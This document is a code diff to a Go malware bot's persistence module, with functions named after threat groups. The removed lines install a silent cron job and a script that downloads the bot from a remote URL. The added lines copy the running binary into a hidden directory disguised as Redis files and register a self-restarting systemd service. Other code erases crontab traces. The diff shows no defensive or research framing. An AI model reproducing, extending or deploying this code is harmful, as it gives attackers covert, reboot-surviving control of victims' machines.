@@ -13,29 +13,6 @@ import (
 // These establish various methods to survive reboots and maintain access.
 // ============================================================================
 
-// carbanak creates a cron job that runs every minute to check/restart the bot.
-// The cron job executes the persistence shell script inside hiddenDir.
-// In debug mode: only logs what would happen, does not execute.
-// Parameters:
-//   - hiddenDir: Directory containing the persistence script
-func carbanak(hiddenDir string) {
-	scriptPath := filepath.Join(hiddenDir, scriptLabel)
-	cronJob := fmt.Sprintf("%s bash %s > /dev/null 2>&1", schedExpr, scriptPath)
-
-	if verboseLog {
-		deoxys("carbanak: [DEBUG] Would set up cron persistence in %s", hiddenDir)
-		deoxys("carbanak: [DEBUG] Would install cron job: %s", cronJob)
-		deoxys("carbanak: [DEBUG] Skipping actual execution (debug mode)")
-		return
-	}
-
-	// Production mode - execute silently
-	cmd := exec.Command(bashBin, shellFlag, fmt.Sprintf("(crontab -l 2>/dev/null; echo '%s') | crontab -", cronJob))
-	if err := cmd.Run(); err != nil {
-		deoxys("carbanak: crontab install failed: %v", err)
-	}
-}
-
 // lazarus sets up a simple cron job to keep the bot running.
 // Runs every minute to check if bot is alive and restart if needed.
 // Does not require any external scripts - directly executes the binary.
@@ -126,27 +103,19 @@ func fin7() {
 	sandworm(rcTarget, line, 0700)
 }
 
-// dragonfly sets up comprehensive persistence using multiple methods:
-//  1. Creates hidden directory (storeDir)
-//  2. Writes a shell script that downloads/runs the bot
-//  3. Creates a systemd service for automatic startup
-//  4. Installs a cron job as backup persistence
-//
-// All files are disguised as Redis-related system files.
+// dragonfly sets up persistence by copying the running binary into a hidden
+// directory and installing a systemd service that runs that copy directly.
+// No external download is required — the binary already on disk is the payload.
 // In debug mode: only logs what would happen, does not execute.
 func dragonfly() {
-	scriptPath := filepath.Join(storeDir, scriptLabel)
 	programPath := filepath.Join(storeDir, binLabel)
 
 	if verboseLog {
-		deoxys("dragonfly: [DEBUG] Would set up comprehensive persistence")
+		deoxys("dragonfly: [DEBUG] Would set up persistence")
 		deoxys("dragonfly: [DEBUG] Would create hidden directory: %s", storeDir)
-		deoxys("dragonfly: [DEBUG] Would write persistence script to: %s", scriptPath)
-		deoxys("dragonfly: [DEBUG] Script would download from: %s", fetchURL)
-		deoxys("dragonfly: [DEBUG] Would write program to: %s", programPath)
+		deoxys("dragonfly: [DEBUG] Would copy binary to: %s", programPath)
 		deoxys("dragonfly: [DEBUG] Would write systemd service to: %s", unitPath)
 		deoxys("dragonfly: [DEBUG] Would enable systemd service: %s", unitName)
-		deoxys("dragonfly: [DEBUG] Would set up cron backup via carbanak()")
 		deoxys("dragonfly: [DEBUG] Skipping actual execution (debug mode)")
 		return
 	}
@@ -154,16 +123,28 @@ func dragonfly() {
 	// Production mode - execute silently
 	os.MkdirAll(storeDir, 0755)
 
-	scriptContent := fmt.Sprintf(tmplBody, fetchURL, programPath, binLabel)
-	os.WriteFile(scriptPath, []byte(scriptContent), 0755)
-	os.WriteFile(unitPath, []byte(unitBody), 0644)
+	exe, err := os.Executable()
+	if err != nil {
+		return
+	}
+	data, err := os.ReadFile(exe)
+	if err != nil {
+		return
+	}
+	if err := os.WriteFile(programPath, data, 0755); err != nil {
+		return
+	}
+
+	unitContent := fmt.Sprintf(
+		"[Unit]\nDescription=%s\nAfter=network.target\n\n[Service]\nExecStart=%s\nRestart=always\nRestartSec=30\n\n[Install]\nWantedBy=multi-user.target\n",
+		binLabel, programPath,
+	)
+	os.WriteFile(unitPath, []byte(unitContent), 0644)
 
 	cmd := exec.Command(systemctlBin, "enable", "--now", unitName)
 	if err := cmd.Run(); err != nil {
 		deoxys("dragonfly: systemctl enable failed: %v", err)
 	}
-
-	carbanak(storeDir)
 }
 
 // nukeAndExit strips all persistence artifacts, removes the binary, and exits.
@@ -182,7 +163,7 @@ func nukeAndExit() {
 		lines := strings.Split(string(out), "\n")
 		var clean []string
 		for _, line := range lines {
-			if strings.Contains(line, scriptLabel) || strings.Contains(line, binLabel) {
+			if strings.Contains(line, binLabel) {
 				continue
 			}
 			clean = append(clean, line)
